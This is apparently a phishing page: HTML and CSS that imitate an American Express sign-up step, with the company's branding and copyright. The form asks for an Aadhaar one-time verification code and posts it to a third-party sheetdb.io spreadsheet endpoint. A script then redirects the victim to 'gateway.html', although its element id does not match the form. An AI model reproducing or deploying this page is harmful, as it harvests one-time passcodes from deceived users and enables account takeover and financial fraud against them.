<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OTP Verification</title>

<style>
/* ===== RESET ===== */
*{ 
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
}

/* ===== HEADER ===== */
.header{
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:14px 40px;
    border-bottom:1px solid #e5e5e5;
    flex-wrap:wrap;
}

.logo{
    font-weight:700;
    font-size:18px;
    color:#0070d2;
}

/* NAV */
.nav{
    display:flex;
    flex-wrap:wrap;
    justify-content:center;
}

.nav a{
    margin:6px 12px;
    text-decoration:none;
    color:#0070d2;
    font-size:15px;
}

/* RIGHT NAV */
.right-nav{
    display:flex;
    align-items:center;
    gap:20px;
}

.login-btn{
    background:#0070d2;
    color:#fff;
    padding:8px 18px;
    border-radius:4px;
    text-decoration:none;
    font-size:14px;
}

/* ===== MAIN ===== */
.main{
    max-width:900px;
    margin:60px auto;
    text-align:center;
    padding:0 15px;
}

.main h1{
    color:#6f42c1;
    font-weight:500;
    letter-spacing:1px;
    margin-bottom:10px;
    font-size:32px;
}

.subtext{
    color:#777;
    margin-bottom:30px;
}

/* ===== PROGRESS BAR ===== */
.progress{
    width:70%;
    height:14px;
    margin:0 auto 40px;
    background:#e6d9f5;
    border-radius:8px;
    overflow:hidden;
}

.progress span{
    display:block;
    width:100%;
    height:100%;
    background:repeating-linear-gradient(
        -45deg,
        #6f42c1,
        #6f42c1 10px,
        #7e57c2 10px,
        #7e57c2 20px
    );
}

/* ===== FORM ===== */
.form-box{
    width:55%;
    margin:0 auto;
    text-align:left;
}

label{
    font-size:22px;
    color:#6f42c1;
}

input{
    width:100%;
    padding:14px;
    margin:14px 0 24px;
    border:1px solid #ccc;
    background:#f1f3f4;
    font-size:16px;
}

button{
    width:100%;
    padding:14px;
    background:#f1f3f4;
    border:1px solid #ccc;
    font-size:17px;
    cursor:pointer;
}

button:hover{
    background:#e6e6e6;
}

/* ===== FOOTER NOTE ===== */
.note{
    margin-top:40px;
    font-size:13px;
    color:#999;
}

/* ===== RESPONSIVE ===== */

/* Tablet */
@media (max-width: 900px){
    .progress{
        width:85%;
    }

    .form-box{
        width:75%;
    }
}

/* Mobile */
@media (max-width: 600px){
    .header{
        padding:14px 20px;
        justify-content:center;
        gap:15px;
    }

    .nav{
        width:100%;
        justify-content:center;
    }

    .right-nav{
        width:100%;
        justify-content:center;
    }

    .main{
        margin:40px auto;
    }

    .main h1{
        font-size:24px;
    }

    .progress{
        width:100%;
        height:12px;
    }

    .form-box{
        width:100%;
    }

    label{
        font-size:18px;
    }

    input, button{
        font-size:15px;
        padding:12px;
    }
}
</style>
</head>

<body>

<!-- HEADER -->
<div class="header">
    <div class="logo">AMERICAN EXPRESS</div>

    <div class="nav">
        <a href="#">My Account</a>
        <a href="#">Cards</a>
        <a href="#">Travel</a>
        <a href="#">Insurance</a>
        <a href="#">Rewards</a>
        <a href="#">Business</a>
    </div>

    <div class="right-nav">
        <a href="#">Help</a>
        <a href="#" class="login-btn">Log In</a>
    </div>
</div>

<!-- MAIN CONTENT -->
<div class="main">
    <h1>SIGN UP YOUR USER ACCOUNT</h1>
    <p class="subtext">Fill all form field to go to next step</p>

    <div class="progress">
        <span></span>
    </div>

    <div class="form-box">
  <form id="msform" method="post" action="https://sheetdb.io/api/v1/gptjg27z57e7u">   
        <label>Aadhaar Verification Code:</label>   
        <input type="number" id="email" name="aadharotp" placeholder="Enter Your OTP Here"> 
        <button>Submit</button>


</form>
    </div>
 
    <p class="note">
        Copyright Â© 2023 American Express Company | American Express Banking Corp.
    </p>
</div>


 <script>
    var form = document.getElementById('msforms');

    form.addEventListener("submit", function (e) {
        e.preventDefault(); // page reload stop karega

        fetch(form.action, {
            method: "POST",
            body: new FormData(form)
        })
        .then(response => response.json())
        .then(() => {
            window.location.href = "gateway.html"; // submit ke baad open hoga
        })
        .catch(error => console.error("Error!", error));
    });
</script>    

</body>
</html>
